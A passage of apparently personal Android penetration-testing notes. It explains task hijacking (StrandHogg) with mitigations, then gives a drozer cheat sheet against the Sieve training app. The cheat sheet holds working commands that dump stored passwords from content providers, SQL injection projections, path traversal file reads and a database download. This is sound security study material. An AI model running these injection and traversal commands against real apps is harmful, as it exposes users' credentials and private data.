class="highlight-pink">default</mark>, every activity has the <mark class="highlight-pink">same affinity as the package name</mark>.</p><ul id="9f6a1b9d-c251-4bdc-b407-6374cb6ea3ac" class="bulleted-list"><li style="list-style-type:disc">Developers can use this tag to group activities that work together. By default, activities in an app share the same task affinity.</li></ul><ul id="9b52bc60-bf90-4809-96b5-7391ff9fbf03" class="bulleted-list"><li style="list-style-type:disc">You can set task affinity using the following code:<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8fdbfc84-c8e8-414d-99d3-4e32d3408b65" class="code"><code class="language-Java" style="white-space:pre-wrap;word-break:break-all">&lt;activity android:taskAffinity=&quot;com.yourpackage.appname OR .task&quot;/&gt;</code></pre></li></ul><p id="9a66fb26-849c-44b7-aa62-460e5ab99278" class=""><mark class="highlight-pink"><strong>Launch Modes</strong></mark><strong>:</strong> Launch modes tell Android how to handle new instances of an activity.</p><p id="11663bfb-e977-4bd7-8620-016a159b6320" class="">There are several launch modes, including:<div class="indented"><ul id="82826169-87e9-42bf-9a5e-abe5aaa1c1a3" class="bulleted-list"><li style="list-style-type:disc">Standard</li></ul><ul id="46aa84f7-61dc-4f8e-912a-545628e6b96d" class="bulleted-list"><li style="list-style-type:disc">Single Top</li></ul><ul id="45500184-afe2-4ba9-a285-578799bedbee" class="bulleted-list"><li style="list-style-type:disc">Single Instant</li></ul><ul id="0ca8e2a9-43dd-4726-997c-bbf0c47c0fc7" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-blue_background"><strong>Single Task</strong></mark><ul id="3bd8198d-aa5d-4c8f-a012-d65c0b525369" class="bulleted-list"><li style="list-style-type:circle">When an activity is set to &quot;singleTask,&quot; Android checks if there&#x27;s already an instance of that activity. If yes, it brings it to the front; if not, it creates a new one.</li></ul></li></ul></div></p><ul id="16556cbc-63c3-43d5-8bba-c0b81bc2fab9" class="bulleted-list"><li style="list-style-type:disc">The <code><strong>[launchMode]</strong></code><strong> </strong>attribute <mark class="highlight-pink">specifies set of instructions for Android on how to open an activity.</mark><ul id="6a0332d3-ba84-4179-9a9c-b05c08295f33" class="bulleted-list"><li style="list-style-type:circle">Different activities in an app might need to be opened in different ways. This attribute helps developers tell Android the preferred way.</li></ul></li></ul><p id="c0d868b1-fec0-4c58-b5fc-f076b35ab747" class="">When the <mark class="highlight-pink">launchMode </mark>is set to <code>singleTask</code>, the Android system evaluates<mark class="highlight-pink"> three possibilities</mark> and one of them is the reason why our attack is possible. Here they are -</p><ul id="b8c54a43-a20f-4110-9e1a-50ff1a03fe82" class="bulleted-list"><li style="list-style-type:disc"><strong>If the Activity instance</strong><mark class="highlight-pink"><strong> already exists</strong></mark>:<br/>Android resumes the existing instance instead of creating a new one. It means that there is at most one activity instance in the system under this mode.<br/></li></ul><ul id="bdd5f7e4-85f4-4d3f-9df9-9d7c3864e017" class="bulleted-list"><li style="list-style-type:disc"><strong>If </strong><mark class="highlight-pink"><strong>creating </strong></mark><strong>a new activity instance </strong><mark class="highlight-pink"><strong>is necessary</strong></mark>:<br/>The Activity Manager Service (<br/><mark class="highlight-pink">AMS</mark>) <mark class="highlight-pink">selects a task</mark> to host the newly created instance by<mark class="highlight-pink"> finding a “</mark><mark class="highlight-pink"><strong>matching</strong></mark><mark class="highlight-pink">” one</mark> in all existing tasks. <mark class="highlight-pink"><strong>An activity “matches” a task</strong></mark><strong> if they have the </strong><mark class="highlight-pink"><strong>same task affinity</strong></mark><mark class="highlight-pink">.</mark> This is the reason why <mark class="highlight-pink">we can </mark><mark class="highlight-pink"><strong>specify the same task affinity as the vulnerable app in our malware/attacker&#x27;s app </strong></mark><strong>so it </strong><mark class="highlight-pink"><strong>launches </strong></mark><strong>in their task instead of</strong><mark class="highlight-pink"><strong> creating it&#x27;s own</strong></mark><mark class="highlight-pink">.</mark></li></ul><ul id="4d5bf16b-7dc3-4be9-9434-6c62bcd81adc" class="bulleted-list"><li style="list-style-type:disc"><strong>If</strong> no<strong> “matching” task found</strong>:<br/>The AMS creates a new task and makes the new activity instance the root activity of the newly created task.<br/></li></ul><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">For simplicity</summary><div class="indented"><h3 id="19f3ab14-49c2-4b5a-a475-e9cbea91b15e" class=""><strong>When launchMode is set to </strong><code><strong>singleTask</strong></code><strong>:</strong></h3><ol type="1" id="9b00e657-30a2-487f-af74-2091fe418052" class="numbered-list" start="1"><li><strong>If the Activity instance already exists:</strong><ul id="4e6b324b-714d-4f28-b08e-f3e627e2c53f" class="bulleted-list"><li style="list-style-type:disc">Imagine you have a book open on a table. If you want to read it again, you don&#x27;t go find a new copy; you just pick up where you left off. Similarly, if an activity is already open, Android brings it to the front instead of creating a new one.</li></ul></li></ol><ol type="1" id="cc9b4a4a-4571-48f8-bf87-1cb09c2feae8" class="numbered-list" start="2"><li><strong>If creating a new activity instance is necessary:</strong><ul id="d1c99436-b4f7-4079-934c-ad6b86981642" class="bulleted-list"><li style="list-style-type:disc">Now, let&#x27;s say you want to read a different book, one that&#x27;s not open. Android needs to decide where to put this new book. It looks at all the bookshelves (tasks) it has and finds one that matches (same task affinity). If there&#x27;s a match, it puts the new book on that shelf. This is why specifying the same task affinity in our malicious app helps it launch in the same &quot;bookshelf&quot; as the vulnerable app.</li></ul></li></ol><ol type="1" id="d90124dc-c31d-4ef1-9672-95682bbe9b6e" class="numbered-list" start="3"><li><strong>If no “matching” task found:</strong><ul id="cfa14556-a1a7-4edc-b1cc-dd7dd73b361d" class="bulleted-list"><li style="list-style-type:disc">If you bring in a brand new book that doesn&#x27;t match any existing bookshelf (task), Android creates a new shelf just for that book. It becomes the first book on a new shelf. This is what happens if no existing task matches the new activity.</li></ul></li></ol></div></details><p id="0adfce8e-658d-41ac-a8e9-e9ff9d19ebd8" class=""><strong>Attack</strong></p><ul id="0bc75fc7-55de-48da-a0f0-cbebd75d7d13" class="bulleted-list"><li style="list-style-type:disc">The victim needs to have the <strong>malicious</strong> <strong>app</strong> <strong>installed</strong> in his device. </li></ul><ul id="55e1a26e-6342-4234-9b4e-9bf8e1182bac" class="bulleted-list"><li style="list-style-type:disc">Then, he needs to <strong>open</strong> <strong>it</strong> <strong>before</strong> opening the <strong>vulnerable</strong> <strong>application</strong>. </li></ul><ul id="a596ca23-9e43-4f2c-baba-78b2879f6667" class="bulleted-list"><li style="list-style-type:disc">Then, when the <strong>vulnerable</strong> application is <strong>opened</strong>, the <strong>malicious</strong> <strong>application</strong> will be <strong>opened</strong> <strong>instead</strong>. </li></ul><p id="0246545b-25a0-4ac7-977e-874d0e087363" class="">If this malicious application presents the <strong>same</strong> <strong>login</strong> as the vulnerable application the <strong>user won&#x27;t have any means to know that he is putting his credentials in a malicious application</strong>.</p><p id="b8406712-156c-4756-9f36-629781b9f8ff" class=""><strong>You can find an attack implemented here:</strong> <a href="https://github.com/az0mb13/Task_Hijacking_Strandhogg"><strong>https://github.com/az0mb13/Task_Hijacking_Strandhogg</strong></a></p><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><mark class="highlight-pink"><em><span style="border-bottom:0.05em solid"><strong>Conclusion:</strong></span></em></mark></summary><div class="indented"><p id="91984daa-3492-4998-8b84-188b26730a77" class=""><strong>Task Hijacking (StrandHogg)</strong> is a security vulnerability that <mark class="highlight-pink">can allow malicious apps to exploit certain attributes and behaviors of Android activities</mark>. By <mark class="highlight-pink">using task affinity</mark>, <mark class="highlight-pink">launch modes</mark>, and other mechanisms, attackers<mark class="highlight-pink"> can inject a malicious app into an affinity</mark>, <mark class="highlight-pink">make it hidden</mark>, and <mark class="highlight-pink">exclude it from recent tasks</mark>. This can deceive users and lead them to <mark class="highlight-pink">interact with the malicious app, thinking it&#x27;s part of a legitimate app.</mark></p></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><mark class="highlight-pink"><em><span style="border-bottom:0.05em solid"><strong>Mitigation:</strong></span></em></mark></summary><div class="indented"><p id="a98f0586-ed79-4bcd-9ee8-cbc5bcb2cfbf" class="">To mitigate the risk of Task Hijacking and similar attacks:</p><ul id="5ba7c4bd-87f3-4c86-b570-2b1871d81bbf" class="bulleted-list"><li style="list-style-type:disc">consider changing the launch mode of your activities from &quot;<mark class="highlight-pink">single task</mark>&quot; to &quot;<mark class="highlight-pink">single instance</mark>&quot; if the app does not want other activities to join tasks belonging to it. </li></ul><ul id="38730bfb-8d06-4b90-a1f9-9c369f5a9139" class="bulleted-list"><li style="list-style-type:disc">A custom <em><span style="border-bottom:0.05em solid"><mark class="highlight-pink"><strong>onBackPressed()</strong></mark></span></em> function can also be added, to override the default behavior.</li></ul><ul id="527775e3-3f05-4e75-bd4a-75f4c98e167b" class="bulleted-list"><li style="list-style-type:disc">Set<code> &lt;activity android:taskAffinity=&quot; &quot;/&gt;</code></li></ul></div></details><p id="9cf2ad15-6d9f-47e7-940d-2b7ae5ef8c99" class=""><mark class="highlight-blue">StrandHogg v2</mark> :</p><p id="6c398661-2513-4cc7-ad9a-7fffdc19fd3f" class="">StrandHogg 2.0 allows for broader attacks and is much more difficult to detect, making it, in effect, its predecessor’s ‘evil twin’. <strong>StrandHogg 2.0 doesn’t require a declaration in an Android manifest file, any special permissions, or root access</strong>.</p></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Drozer</summary><div class="indented"><ul id="40471fac-c7dd-4f09-9534-7dd91b9aee6b" class="bulleted-list"><li style="list-style-type:disc"><code>drozer agent </code>and <code>drozer in lab</code> is used together as a <mark class="highlight-orange">C2 </mark>to make <mark class="highlight-orange">Enumeration</mark>, drozer <mark class="highlight-orange">don’t have any permissions except Internet perms</mark>. that means if it catch any data that means a vulnerability in the third party app not a permission given to <code>drozer</code></li></ul><ul id="7918b75c-7277-450d-89c9-36f845c5a8dd" class="bulleted-list"><li style="list-style-type:disc">it can aslo enumerate all <code>exported </code>components in the APK then you have to go check manually, since the manifest file in real life is very large so it would be much easier to start with <code>drozer</code><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Drozer cheat sheet</summary><div class="indented"><figure id="8234986b-cbe6-4acc-9ae0-7cc95839c1ba" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2066.png"><img style="width:480px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2066.png"/></a><figcaption>Modules to be run in <code>drozer</code></figcaption></figure><p id="c4d18d9d-8baa-42de-80ab-994bf7fafbc3" class=""><mark class="highlight-blue"><strong>listing information about installed packages on the Android device.</strong></mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="06fbdbfe-561b-4542-a46d-96fbfb07e805" class="code"><code class="language-JavaScript">dz&gt; run app.package.list -f sieve // -f to filter or grep</code></pre><p id="f3204111-5b10-473d-b218-813b63d66a21" class="">
</p><p id="6d3b87e5-59cb-4227-b50b-8ad398946087" class=""><mark class="highlight-blue"><strong>Provide some basic information about the package using the </strong></mark><strong><code>app.package.info</code></strong><mark class="highlight-blue"><strong> command</strong></mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4c83a53d-b76e-4136-b083-c0a9144564df" class="code"><code class="language-JavaScript">dz&gt; run app.package.info -a com.mwr.example.sieve</code></pre><p id="7ffb9d56-9955-4b98-b739-63b9b1d35276" class="">
</p><p id="2c1377a8-4f51-4bde-ba40-7266a0002f00" class=""><mark class="highlight-blue"><strong>Identify the Attack Surface</strong></mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a38fd7d2-052d-4d10-bbf1-38c931a71f02" class="code"><code class="language-JavaScript">dz&gt; run app.package.attacksurface com.mwr.example.sieve</code></pre><p id="aec7dc46-1dcc-4817-8696-df3665d2eb20" class="">
</p><p id="d78e63b4-7f17-4996-b2cf-5d16c1add9ea" class=""><mark class="highlight-blue"><strong>Launching Activities</strong></mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="99564973-afc1-4b10-a076-ff3940ab9a5b" class="code"><code class="language-JavaScript">dz&gt; run app.activity.info -a com.mwr.example.sieve

Package: com.mwr.example.sieve
com.mwr.example.sieve.FileSelectActivity
com.mwr.example.sieve.MainLoginActivity
com.mwr.example.sieve.PWList</code></pre><p id="549e792b-013f-44bc-975e-c81a80ce82ae" class="">
</p><p id="dff4c562-7524-42cf-98b9-bfdd7104e25f" class=""><mark class="highlight-blue"><strong>Launch exported Activities</strong></mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="48df2614-361f-4128-b7af-34a4ff85ad02" class="code"><code class="language-JavaScript">dz&gt; run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
com.ifountain.opsgenie.ui.screens.deeplink.DeepLinkHandlerActivity</code></pre><p id="3eba2019-c527-4f0f-be1a-150b2623c565" class="">
</p><p id="021b02d0-da63-423b-a9fa-ffe9786f4c9e" class=""><mark class="highlight-blue"><strong>Reading from Content Providers</strong></mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="46d760dd-e146-4848-b8d9-a247847c3171" class="code"><code class="language-JavaScript">dz&gt;run app.provider.info -a com.mwr.example.sieve</code></pre><p id="cf499b50-577b-4d5a-a49f-335ee74bf8c5" class="">
</p><p id="f4debf7b-57dd-48f7-9954-ee1ffa2d978e" class=""><mark class="highlight-blue"><strong>Database-backed Content Providers (Data Leakage)</strong></mark></p><p id="32b7a5c1-1df5-416d-ae9d-ba68e0ce7e0e" class="">Drozer provides a scanner module that brings together various ways to guess paths and divine a list of accessible content URIs:<br/><br/></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6f627ef2-2f28-4cfa-8766-e5b9e14c2228" class="code"><code class="language-JavaScript">dz&gt; run scanner.provider.finduris -a com.mwr.example.sieve

Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/ ...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/</code></pre><p id="d27e625f-50f3-40e9-86e6-6ebff46bf217" class="">
</p><p id="3b995c08-1cf9-4e48-bb47-2c7ecbf0e209" class=""><mark class="highlight-blue"><strong>We can now use other drozer modules to retrieve information from those content URIs, or even modify the data in the database:</strong></mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b1f4ce1f-d8e4-405a-9ba5-51387cc2dbd3" class="code"><code class="language-JavaScript">dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical

id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w== (Base64-encoded) email: incognitoguy50@gmail.com</code></pre><p id="693001a9-c23e-4add-8a48-501ce223dd58" class="">
</p><p id="e9b6ba7c-d83e-424b-8634-32b2f95dd91a" class=""><mark class="highlight-blue"><strong>Database-backed Content Providers (SQL Injection)</strong></mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="51972e39-c10f-4039-9af6-83b48f2864d1" class="code"><code class="language-JavaScript">dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#x27;&quot;
dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection &quot;&#x27;&quot;</code></pre><p id="4e6a6e2c-ea19-46b9-9281-bbe3bc9eca91" class="">Android returns a very verbose error message, showing the entire query that it tried to execute.<br/>We can fully exploit this vulnerability to list all tables in the database:<br/></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="90c1c1f3-42e4-4bd9-b1aa-039246b9901d" class="code"><code class="language-JavaScript">dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;
dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM Key;--&quot;</code></pre><p id="ae0874d4-ea5a-4c9c-bcf6-18d93dda2b10" class="">
</p><p id="58373326-4844-4b1a-8d34-c3ffa7daa778" class=""><mark class="highlight-blue"><strong>File System-backed Content Providers</strong></mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ae9ce4f4-3138-440d-afbd-1fb6ba199924" class="code"><code class="language-JavaScript">dz&gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</code></pre><p id="9d923d86-eb4b-4d6b-b04c-0d97a5fe909c" class="">
</p><p id="f930de9b-76d7-47e8-9830-6db11adec197" class=""><mark class="highlight-blue"><strong>to dump the db to local machine</strong></mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c02e08b8-7716-4bca-80cb-23c2f7e21dae" class="code"><code class="language-JavaScript">dz&gt; run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data /data/com.mwr.example.sieve/databases/database.db /home/user/database.db
</code></pre><p id="115c1a15-cc6c-488f-b64b-cf8661cce4b4" class="">
</p><p id="d3f6d1ea-57f1-4219-bf09-5eadeab6f77b" class=""><mark class="highlight-blue"><strong>Content Provider Vulnerabilities</strong></mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0d997ca2-c18d-4fcb-819c-2b2c8e04122d" class="code"><code class="language-JavaScript">dz&gt; run scanner.provider.injection -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Injection in Projection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/</code></pre><p id="53d9d949-6f2e-4fc5-90a6-306ea0363dac" class="">
</p><p id="3bdee4ce-142c-4ce6-97cb-3864792e4f6c" class=""><mark class="highlight-blue"><strong>to test LFI OR file path travesals  Or reading local files via vulnerble content providers in the app</strong></mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a08a3725-7df9-4664-82ea-9cb1f6c0bfb8" class="code"><code class="language-JavaScript">dz&gt; run scanner.provider.traversal -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Vulnerable Providers:
content://com.mwr.example.sieve.FileBackupProvider/
content://com.mwr.example.sieve.FileBackupProvider</code></pre><p id="f3a66ba2-ffe9-4327-83b6-8a507253014e" class="">
</p><p id="2fae773a-628a-4aec-be32-57a0250188fa" class=""><mark class="highlight-blue"><strong>to read</strong></mark></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1ac4e6df-193d-4158-934a-2c309dee665a" class="code"><code class="language-JavaScript">dz&gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
</code></pre><p id="18c620dd-66f9-4d76-96be-90f20cc1c5a2" class="">
